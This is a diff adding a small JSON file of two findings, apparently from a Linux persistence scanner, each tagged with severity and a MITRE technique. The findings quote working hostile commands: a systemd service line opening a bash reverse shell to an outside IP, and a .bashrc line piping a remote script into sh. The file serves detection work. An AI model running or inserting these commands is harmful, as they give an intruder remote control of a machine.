@@ -1,0 +1,16 @@
+[
+  {
+    "location": "/etc/systemd/system/evil.service",
+    "line": "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.45/4444 0>&1'",
+    "reason": "Reverse shell (/dev/tcp)",
+    "severity": "CRITICAL",
+    "mitre": "T1543.002 Systemd Service"
+  },
+  {
+    "location": "/home/youssef/.bashrc",
+    "line": "curl http://185.220.101.45/beacon.sh | sh",
+    "reason": "Curl piped to shell (payload download)",
+    "severity": "HIGH",
+    "mitre": "T1546.004 Shell RC"
+  }
+]
